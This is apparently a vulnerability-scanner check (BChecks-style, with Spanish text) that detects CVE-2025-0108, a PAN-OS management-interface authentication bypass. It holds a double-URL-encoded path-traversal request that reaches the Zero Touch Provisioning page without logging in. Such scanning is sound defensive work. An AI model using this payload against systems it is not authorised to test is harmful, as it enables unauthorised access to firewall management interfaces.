metadata:
    language: v2-beta
    name: "[CVE-2025-0108] PAN-OS Ruta de interfaz de administración Confusión Omisión de autenticación"
    description: "Comprueba la omisión de autenticación mediante confusión de rutas en la interfaz de administración de PAN-OS (CVE-2025-0108)"
    author: "P4IM0N, halencarjunior, ritikchaddha"
    tags: "CVE-2025-0108", "panos", "auth-bypass", "path-confusion", "critical"

run for each:
    potential_path = "/unauth/%252e%252e/php/ztp_gate.php/PAN_help/x.css"

given host then
    send request called check:
        method: "GET"
        path: {potential_path}

    if {check.response.status_code} is "200" and
        ("<title>Zero Touch Provisioning" in {check.response.body} or
        "Zero Touch Provisioning (ZTP)" in {check.response.body}) and
        ("text/html" in {to_lower(check.response.headers)}) then
        report issue:
            severity: high
            confidence: certain
            detail: `**Omisión de autenticación mediante confusión de rutas en PAN-OS (CVE-2025-0108)**
Una solicitud especialmente elaborada para {potential_path} Utiliza doble codificación de URL y recorrido de directorio para eludir las comprobaciones de autenticación debido a las diferencias en el manejo de rutas entre Nginx y Apache. Una respuesta 200 con el título "Aprovisionamiento sin intervención" confirma la vulnerabilidad.`
            remediation: "Actualice PAN-OS a la última versión y aplique las reglas del servidor web para evitar la doble decodificación o inconsistencias en el recorrido de ruta."
    end if